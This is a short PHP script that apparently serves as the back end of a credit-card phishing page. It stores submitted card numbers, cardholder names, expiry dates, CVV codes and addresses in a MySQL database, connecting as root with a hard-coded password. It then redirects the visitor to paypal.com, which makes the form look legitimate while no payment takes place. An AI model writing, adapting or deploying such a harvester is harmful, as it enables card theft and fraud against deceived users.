<?php
$host = "localhost";
$usuario = "root";
$contrasena = "050201";
$base_de_datos = "tarjetas";

$conn = new mysqli($host, $usuario, $contrasena, $base_de_datos);

if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

$numero = isset($_POST['numero']) ? trim($_POST['numero']) : '';
$titular = isset($_POST['titular']) ? trim($_POST['titular']) : '';
$tipo = isset($_POST['tipo']) ? trim($_POST['tipo']) : '';
$exp = isset($_POST['exp']) ? trim($_POST['exp']) : '';
$cvv = isset($_POST['cvv']) ? trim($_POST['cvv']) : '';
$direccion = isset($_POST['direccion']) ? trim($_POST['direccion']) : '';

$sql = "INSERT INTO tarjetas (numero, titular, tipo, exp, cvv, direccion) VALUES (?, ?, ?, ?, ?, ?)";
$stmt = $conn->prepare($sql);

if (!$stmt) {
    die("Error en prepare: " . $conn->error);
}

$stmt->bind_param("ssssss", $numero, $titular, $tipo, $exp, $cvv, $direccion);

if (!$stmt->execute()) {
    die("Error al ejecutar: " . $stmt->error);
}

$stmt->close();
$conn->close();

header("Location: https://www.paypal.com");
exit;
?>
